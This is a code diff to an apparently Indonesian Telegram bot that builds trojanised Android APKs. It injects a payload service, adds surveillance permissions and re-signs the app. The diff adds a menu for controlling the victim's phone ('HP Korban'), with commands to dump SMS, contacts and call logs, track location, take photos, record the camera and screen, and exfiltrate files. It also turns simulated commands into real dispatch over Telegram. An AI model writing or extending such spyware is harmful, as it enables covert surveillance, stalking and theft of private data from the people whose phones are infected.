@@ -3,6 +3,7 @@ import subprocess
 import logging
 import shutil
 import uuid
+import zipfile
 import xml.etree.ElementTree as ET
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
@@ -16,12 +17,10 @@ KEYSTORE_PATH = f"{WORK_DIR}/app_debug.keystore"
 KEYSTORE_PASS = "123456"
 KEY_ALIAS = "debugkey"
 PAYLOAD_SMALI_DIR = f"{WORK_DIR}/payload_smali/com/system/update"
-
-# Pastikan path ini sesuai dengan tempat kamu naruh zipalign.jar
 ZIPALIGN_JAR = f"{WORK_DIR}/zipalign.jar" 
 
 os.makedirs(WORK_DIR, exist_ok=True)
-logging.disable(logging.CRITICAL) # Biar layar Termux bersih
+logging.disable(logging.CRITICAL)
 
 user_states = {} 
 
@@ -33,7 +32,7 @@ def inject_manifest(manifest_path):
     root = tree.getroot()
     ns = '{http://schemas.android.com/apk/res/android}'
     
-    permissions = ["android.permission.INTERNET", "android.permission.READ_SMS", "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG", "android.permission.CAMERA"]
+    permissions = ["android.permission.INTERNET", "android.permission.READ_SMS", "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG", "android.permission.CAMERA", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.ACCESS_FINE_LOCATION"]
     for perm in permissions:
         if not any(p.get(ns + 'name') == perm for p in root.findall('uses-permission')):
             ET.SubElement(root, 'uses-permission', {ns + 'name': perm})
@@ -44,7 +43,7 @@ def inject_manifest(manifest_path):
             ET.SubElement(app, 'service', {ns + 'name': '.Payload', ns + 'enabled': 'true', ns + 'exported': 'false'})
     tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
 
-# ── TAMPILAN START (2 PILIHAN) ──
+# ── TAMPILAN START ──
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_authorized(update): return
     
@@ -67,7 +66,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = [
         [InlineKeyboardButton("📦 Build APK Baru", callback_data="menu_build")],
-        [InlineKeyboardButton("📱 List Device Ter-Sadap", callback_data="menu_device")]
+        [InlineKeyboardButton("📱 List Device Ter-Sadap", callback_data="menu_device")],
+        [InlineKeyboardButton("💾 Backup Data (Pindah HP)", callback_data="menu_backup")]
     ]
     
     if update.callback_query:
@@ -94,7 +94,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == "menu_device":
         keyboard = [
             [InlineKeyboardButton("📱 HP Korban 1", callback_data="device_1")],
-            [InlineKeyboardButton("📱 HP Korban 2", callback_data="device_2")],
             [InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")]
         ]
         await query.edit_message_text(
@@ -104,23 +103,66 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
 
+    elif query.data == "menu_backup":
+        await query.edit_message_text("⏳ Sedang membackup semua data...")
+        zip_path = f"{WORK_DIR}/backup_r4t.zip"
+        try:
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for file in ["builder_bot.py", "app_debug.keystore", "zipalign.jar", "devices.db"]:
+                    filepath = f"{WORK_DIR}/{file}"
+                    if os.path.exists(filepath):
+                        zipf.write(filepath, file)
+                
+                if os.path.exists(f"{WORK_DIR}/payload_smali"):
+                    for root, dirs, files in os.walk(f"{WORK_DIR}/payload_smali"):
+                        for file in files:
+                            filepath = os.path.join(root, file)
+                            arcname = os.path.relpath(filepath, WORK_DIR)
+                            zipf.write(filepath, arcname)
+
+            with open(zip_path, "rb") as f:
+                await context.bot.send_document(chat_id=ALLOWED_CHAT_ID, document=f, filename="backup_r4t.zip")
+            
+            os.remove(zip_path)
+            await query.message.reply_text("✅ **Backup Berhasil!** File `.zip` udah dikirim di atas.")
+            await start(update, context)
+        except Exception as e:
+            await query.message.reply_text(f"❌ Gagal Backup: {e}")
+            await start(update, context)
+
     elif query.data == "back_start":
         await start(update, context)
         
-    elif query.data in ["device_1", "device_2"]:
+    # ── MENU KONTROL DEVICE (13 FITUR) ──
+    elif query.data == "device_1":
         keyboard = [
-            [InlineKeyboardButton("📩 SMS", callback_data="cmd_sms"), InlineKeyboardButton("👥 Kontak", callback_data="cmd_kontak")],
-            [InlineKeyboardButton("📞 Telpon", callback_data="cmd_telpon"), InlineKeyboardButton("📸 Foto", callback_data="cmd_foto")],
+            [InlineKeyboardButton("📂 Cek File", callback_data="cmd_cek_file"), InlineKeyboardButton("📤 Send File", callback_data="cmd_send_file")],
+            [InlineKeyboardButton("📩 Dump SMS", callback_data="cmd_dump_sms"), InlineKeyboardButton("📞 Dump Telpon", callback_data="cmd_dump_telpon")],
+            [InlineKeyboardButton("👥 Dump Kontak", callback_data="cmd_dump_kontak"), InlineKeyboardButton("📍 Lacak Lokasi", callback_data="cmd_lacak")],
+            [InlineKeyboardButton("📸 Foto Depan", callback_data="cmd_foto_depan"), InlineKeyboardButton("📷 Foto Belakang", callback_data="cmd_foto_belakang")],
+            [InlineKeyboardButton("🎥 Rekam Depan", callback_data="cmd_rekam_depan"), InlineKeyboardButton("🎥 Rekam Belakang", callback_data="cmd_rekam_belakang")],
+            [InlineKeyboardButton("🖼️ Screenshot", callback_data="cmd_ss"), InlineKeyboardButton("⏺️ Screen Record", callback_data="cmd_screen_record")],
+            [InlineKeyboardButton("🌐 Buka URL", callback_data="cmd_buka_url")],
             [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]
         ]
         await query.edit_message_text(
-            "🎮 **Menu Kontrol Device**\nPilih aksi:",
+            "🎮 **Menu Kontrol HP Korban**\nPilih aksi yang ingin dijalankan:",
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='Markdown'
         )
 
+    # ── EKSEKUSI TOMBOL (NEMBAK KE CHAT) ──
     elif query.data.startswith("cmd_"):
-        await query.edit_message_text("⏳ Mengirim perintah ke HP korban...\n*(Simulasi)*")
+        # Ngambil nama perintah dari callback data (misal: cmd_dump_sms -> /dump_sms)
+        perintah = "/" + query.data.replace("cmd_", "")
+        
+        # Bot nembak perintah ke chat kamu, biar ditangkep sama APK korban
+        await context.bot.send_message(
+            chat_id=ALLOWED_CHAT_ID, 
+            text=perintah
+        )
+        
+        await query.message.reply_text(f"⏳ Perintah `{perintah}` berhasil dikirim ke HP korban.\n*(Tunggu beberapa detik...)*", parse_mode='Markdown')
 
 # ── PROSES BUILD APK ──
 async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, file_name: str):
@@ -153,9 +195,7 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔐 [5/5] Menandatangani APK...")
         signed_apk = f"{apk_new_path}.signed.apk"
         
-        # Pakai zipalign.jar yang udah didownload
         subprocess.run(f"java -jar {ZIPALIGN_JAR} -p -f 4 '{apk_new_path}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
-        # Pakai apksigner bawaan Termux
         subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
 
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="✅ **BUILD SUKSES!** APK siap di-install:", parse_mode='Markdown')
